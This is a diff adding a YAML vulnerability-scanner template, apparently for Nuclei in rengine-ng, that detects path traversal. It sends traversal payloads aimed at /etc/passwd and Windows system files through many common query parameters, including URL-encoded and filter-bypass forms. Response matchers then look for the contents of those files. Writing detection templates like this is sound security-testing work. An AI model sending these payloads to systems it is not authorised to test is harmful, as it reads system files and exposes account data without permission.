@@ -1,0 +1,55 @@
+id: path-traversal
+
+info:
+  name: Path Traversal / Directory Traversal
+  author: rengine-ng
+  severity: high
+  description: Detects path traversal vulnerabilities allowing file system access
+  tags: lfi,path-traversal,vulnerability
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=../../../../etc/passwd"
+      - "{{BaseURL}}/?path=../../../../etc/passwd"
+      - "{{BaseURL}}/?page=../../../../etc/passwd"
+      - "{{BaseURL}}/?include=../../../../etc/passwd"
+      - "{{BaseURL}}/?doc=../../../../etc/passwd"
+      - "{{BaseURL}}/?filename=../../../../etc/passwd"
+      - "{{BaseURL}}/?dir=../../../../etc/passwd"
+      - "{{BaseURL}}/?template=../../../../etc/passwd"
+      - "{{BaseURL}}/?load=../../../../etc/passwd"
+      - "{{BaseURL}}/?read=../../../../etc/passwd"
+      - "{{BaseURL}}/?view=../../../../etc/passwd"
+      - "{{BaseURL}}/?pg=../../../../etc/passwd"
+      - "{{BaseURL}}/?p=../../../../etc/passwd"
+      - "{{BaseURL}}/?show=../../../../etc/passwd"
+      # URL encoded
+      - "{{BaseURL}}/?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+      - "{{BaseURL}}/?file=....//....//....//....//etc/passwd"
+      # Windows
+      - "{{BaseURL}}/?file=../../../../windows/win.ini"
+      - "{{BaseURL}}/?file=../../../../windows/system32/drivers/etc/hosts"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]:0:0"
+          - "daemon:[x*]:[0-9]"
+          - "/bin/bash"
+          - "/bin/sh"
+          - "nobody:[x*]"
+
+      - type: word
+        part: body
+        words:
+          - "[extensions]"
+          - "for 16-bit app support"
+          - "127.0.0.1"
+        condition: and
